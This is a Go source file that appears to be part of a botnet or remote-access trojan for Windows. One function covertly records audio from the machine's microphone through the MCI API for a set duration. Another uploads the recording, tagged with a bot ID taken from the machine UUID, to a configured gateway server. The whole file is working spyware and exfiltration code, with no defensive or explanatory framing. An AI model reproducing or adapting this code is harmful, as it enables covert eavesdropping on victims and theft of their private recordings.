package main

import (
	"bytes"
	"fmt"
	"golang.org/x/sys/windows"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"time"
	"unsafe"
)

type AudioCaptureParams struct {
	Length int64  `json:"length"`
	Path   string `json:"path"`
}

// https://github.com/SaturnsVoid/Record-Audio-on-Windows/blob/master/main.go

func MCIWorker(lpstrCommand string, lpstrReturnString string, uReturnLength int, hwndCallback int) uintptr {
	i, _, _ := mciSendString.Call(uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(lpstrCommand))),
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(lpstrReturnString))),
		uintptr(uReturnLength), uintptr(hwndCallback))
	//fmt.Println("MCI OUTPUT: " + err.Error(), " COMMAND: " + lpstrCommand)
	return i
}

func RecordAudio(params AudioCaptureParams) bool {
	i := MCIWorker("open new type waveaudio alias capture", "", 0, 0)
	if i != 0 {
		log.Fatal("Error Code A: ", i)
	}

	i = MCIWorker("record capture", "", 0, 0)
	if i != 0 {
		log.Fatal("Error Code B: ", i)
	}

	fmt.Println("Listening...")

	time.Sleep(time.Duration(params.Length) * time.Second)

	i = MCIWorker(fmt.Sprintf("save capture %s", params.Path), "", 0, 0)
	if i != 0 {
		log.Fatal("Error Code C: ", i)
	}

	i = MCIWorker("close capture", "", 0, 0)
	if i != 0 {
		log.Fatal("Error Code D: ", i)
	}
	return true
}

func UploadAudio(filePath string) {
	config := loadConfig(true)

	url := config.Gateway + "/"

	uuid, err := GetMachineUUID()

	var buf bytes.Buffer

	// Create a new multipart writer with the buffer
	w := multipart.NewWriter(&buf)

	_ = w.WriteField("botId", uuid)
	_ = w.WriteField("uploadType", "audio")

	// Add a file to the request
	file, err := os.Open(filePath)
	if err != nil {
		log.Fatal(err)
	}

	// Create a new form field
	fw, err := w.CreateFormFile("file", filePath)
	if err != nil {
		log.Fatal(err)
	}

	// Copy the contents of the file to the form field
	if _, err := io.Copy(fw, file); err != nil {
		log.Fatal(err)
	}

	// Close the multipart writer to finalize the request
	w.Close()

	// Send the request
	req, err := http.NewRequest("POST", url, &buf)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	file.Close()
}
